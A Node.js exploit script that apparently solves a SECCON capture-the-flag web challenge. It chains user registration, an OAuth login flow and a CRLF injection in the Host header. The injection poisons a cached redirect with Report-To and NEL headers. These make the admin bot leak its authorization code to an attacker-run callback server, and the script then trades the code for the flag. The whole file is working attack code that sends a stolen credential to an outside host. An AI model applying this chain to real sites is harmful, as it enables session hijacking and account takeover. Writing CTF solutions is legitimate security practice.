const crypto = require('crypto');
const https = require('https');
const http = require('http');
const fs = require('fs');

const args = process.argv.slice(2);
const BASE_HOSTNAME = args[0] || process.env.SECCON_HOST;
const AUTH_URL = `https://auth.${BASE_HOSTNAME}`;
const APP_URL = `https://app.${BASE_HOSTNAME}`;
const ADMIN_URL = `https://admin.${BASE_HOSTNAME}`;
const BOT_URL = `http://${BASE_HOSTNAME}:1337`;
const SOLVER_URL = `https://${process.env.CONNECTBACK_HOST}:${process.env.CONNECTBACK_PORT}`;

if (!BASE_HOSTNAME) {
    console.error('Usage: node solve.js <base_hostname>');
    process.exit(1);
}

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function assert(condition, message) {
    if (!condition) {
        throw new Error(message);
    }
}

async function waitForCallback() {
    return new Promise((resolve, reject) => {
        const server = https.createServer({
            key: fs.readFileSync('key.key'),
            cert: fs.readFileSync('cert.crt')
        }, (request, response) => {
            console.log(`Received request: ${request.method} ${request.url}`);
            let body = '';
            request.on('data', (chunk) => {
                body += chunk;
            });
            request.on('end', () => {
                if (request.method === 'POST') {
                    const data = JSON.parse(body);
                    for (const req of data) {
                        console.log(`Received request: ${req.url}`);
                        const url = new URL(req.url, 'http://localhost');
                        const code = url.searchParams.get('code');
                        if (code) {
                            server.close();
                            resolve(code);
                            return;
                        }
                    }
                }
            });
            respond(response, 200, '', {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': request.headers['Access-Control-Allow-Methods'] || request.method,
                'Access-Control-Allow-Headers': request.headers['Access-Control-Allow-Headers'] || 'Content-Type'
            });
        });

        function respond(response, code, body, headers) {
            response.writeHead(code, { ...headers, 'Content-Length': body.length });
            response.end(body);
        }

        server.listen(6512);
        console.log(`Receiver server started on port 6512 -> ${process.env.CONNECTBACK_PORT}`);
    });
}

async function solve() {
    const solverRandStr = crypto.randomUUID().replace(/-/g, '').slice(0, 20);

    let resp = await fetch(AUTH_URL + '/registration', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `username=${solverRandStr}&password=${solverRandStr}`
    });

    assert(resp.status === 200, `Failed to register user: ${resp.status}`);
    console.log('Registered user:', solverRandStr);

    resp = await fetch(AUTH_URL + '/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `username=${solverRandStr}&password=${solverRandStr}`,
        redirect: 'manual'
    });
    assert(resp.status === 302, 'Failed to login');
    console.log('Logged in');
    
    const cookies = resp.headers.get('set-cookie');
    assert(cookies, 'Failed to get cookies');
    console.log('Got cookies:', cookies);

    resp = await fetch(APP_URL + '/', {
        redirect: 'manual'
    });
    assert(resp.status === 302, 'Failed to get state response');
    console.log('Got state response');

    const stateCookie = resp.headers.get('set-cookie');
    const state = stateCookie.split('state=')[1].split(';')[0];
    assert(state, 'Failed to get state');
    console.log('Got state:', state);


    resp = await fetch(AUTH_URL + '/auth/login?login_target=APP&state=' + state, {
        headers: {
            Cookie: cookies
        },
        redirect: 'manual'
    });
    assert(resp.status === 302, 'Failed to call auth callback');
    console.log('Called auth callback');
    
    const redirectedURL = resp.headers.get('location');
    assert(redirectedURL, 'Failed to get redirected URL');
    console.log('Redirected to:', redirectedURL);

    resp = await fetch(redirectedURL, {
        headers: {
            Cookie: `state=${state}`
        },
        redirect: 'manual'
    });
    assert(resp.status === 302, 'Failed to get login cookies');

    const loginCookies = resp.headers.get('set-cookie');
    const jwtToken = loginCookies.split('jwt_token=')[1].split(';')[0];
    assert(jwtToken, 'Failed to get JWT token');
    console.log('Got JWT token:', jwtToken);

    resp = await fetch(APP_URL + '/shorten', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            Cookie: `jwt_token=${jwtToken}`
        },
        body: JSON.stringify({
            url: '/a',
            short_code: `static${solverRandStr}`
        })
    });
    assert(resp.status === 200, 'Failed to shorten URL');
    console.log('Created URL:', APP_URL + `/static${solverRandStr}`);
    
    console.log("Poluting cache...")
    const options = {
        hostname: APP_URL.replace('https://', ''),
        port: 443,
        path: `/static${solverRandStr}`,
        method: 'GET',
        headers: {
            'Host': `app.${BASE_HOSTNAME}:@auth.${BASE_HOSTNAME}%2Fauth%2Flogin?login_target=APP&state=asdf%0d%0aReport-To:%20{"group":"test","max_age":600,"endpoints":[{"url":"${encodeURIComponent(SOLVER_URL)}"}]}%0d%0aNEL:%20{"report_to":"test","max_age":600}%0d%0aa:%20`
        }
    };

    resp = await new Promise((resolve, reject) => {
        const req = https.request(options);
        req.on('error', reject);
        req.on('response', (resp) => {
            resp.on('data', () => { });
            resolve(resp);
        });
        req.end();
    });
    assert(resp.statusCode === 302, 'Failed to pollute cache');

    resp = await fetch(APP_URL + `/static${solverRandStr}`, {
        redirect: 'manual'
    });
    assert(resp.status === 302, 'Failed to check the pollution result');

    const nelHeader = resp.headers.get('NEL');
    assert(nelHeader, `Could not find NEL header: ${resp.headers}`);

    console.log('Created URL:', APP_URL + `/static${solverRandStr}`);

    waitForCallback().then(async (code) => {
        console.log('Got auth code:', code);

        resp = await fetch(ADMIN_URL + `/auth/callback?code=${code}%26login_target=APP%23&state=a`,{
            headers: {
                Cookie: `state=a`
            }
        });
        console.log('Got auth callback response:', resp.status);

        const body = await resp.text();
        assert(resp.status === 200, `Failed to call auth callback: ${body}`);
        console.log('Got flag:', body);
        process.exit(0);
    });

    await sleep(5_000);
    

    resp = await fetch(BOT_URL + `/api/report`,{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            url: APP_URL + `/static${solverRandStr}`
        })
    });
    assert(resp.status === 200, 'Failed to report URL');
    console.log('Reported URL: ', await resp.text());

    // HACK: Because the callback server waits forever, consider it a fail after 10 seconds
    setTimeout(() => {
        process.exit(1);
    }, 10_000);
}
solve().catch(console.error);
